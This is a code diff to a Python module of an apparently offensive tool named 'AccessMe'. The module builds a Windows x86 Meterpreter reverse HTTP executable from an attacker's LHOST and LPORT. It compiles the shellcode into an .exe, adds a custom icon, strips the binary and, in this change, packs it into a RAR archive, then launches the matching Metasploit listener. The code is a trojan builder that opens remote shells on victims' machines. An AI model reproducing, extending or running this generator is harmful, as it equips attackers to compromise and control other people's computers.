@@ -1,5 +1,6 @@
-from lib import core
-from payload import gen
+from lib import core, gen
+
+
 
 def Construction():
 
@@ -10,22 +11,7 @@ def Construction():
     
     RC_PAYLOAD = "windows/meterpreter/reverse_http"
     
-    print("Payload x86 Meterpreter Reverse HTTP")
-    core.x86_Windows_Features()
-
-    Features_while = True
-
-    while Features_while:
-
-        Choice = core.core_input_pass()
-
-        if Choice == "":
-            core.Clear()
-            Features_while = False
-
-        else:
-            core.Clear()
-            Features_while = False
+    print(core.amcolors.PURPLE + core.amcolors.PURPLE + "Payload x86 Meterpreter Reverse HTTP" + core.amcolors.ENDC)
 
     Gen_Payload = True
 
@@ -33,11 +19,13 @@ def Construction():
 
         LHOST = gen.LHOST_Input()
         LPORT = gen.LPORT_Input()
-        FILENAME = "/root/AccessMe/Output/" + gen.FILENAME_Input() + ".exe"
+        FILENAME = "/root/AccessMe/output/" + gen.FILENAME_Input() + ".exe"
 
         PAYLOAD = gen.Gen_Shellcode(ARCH, PROTOCOLE, TYPE, LHOST, LPORT)
 
-        print("Génération du fichier...")
+        core.Clear()
+
+        print(core.amcolors.OCRA + core.amcolors.BOLD + "[*] Code generation." + core.amcolors.ENDC)
 
         Final_Code = "#include <windows.h>\n"
         Final_Code += "#include <stdio.h>\n"
@@ -50,21 +38,23 @@ def Construction():
         with open('source.c', 'w') as f:
             f.write(Final_Code)
 
-        print("[+] Code generated.")
+        print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Code generated." + core.amcolors.ENDC)
 
         ICON = gen.Add_Icon()
 
-        print("[*] Compiling.")
+        print(core.amcolors.OCRA + core.amcolors.BOLD + "\n[*] Compiling." + core.amcolors.ENDC)
 
         gen.Auto_Compiler(FILENAME, ARCH, PLATFORM, ICON)
 
-        print("[*] Stripping executable.")
+        print(core.amcolors.OCRA + core.amcolors.BOLD + "\n[*] Stripping executable." + core.amcolors.ENDC)
 
         gen.Auto_Executable_Strip(FILENAME, PLATFORM)
 
+        gen.Compress_Rar(FILENAME)
+
         gen.Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT)
 
-        print("[+] Complete task.")
-        print("[+] Exiting script.")
+        print(core.amcolors.GREEN + core.amcolors.BOLD + "\n[+] Complete task." + core.amcolors.ENDC)
+        print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Exiting script." + core.amcolors.ENDC)
 
         Gen_Payload = False
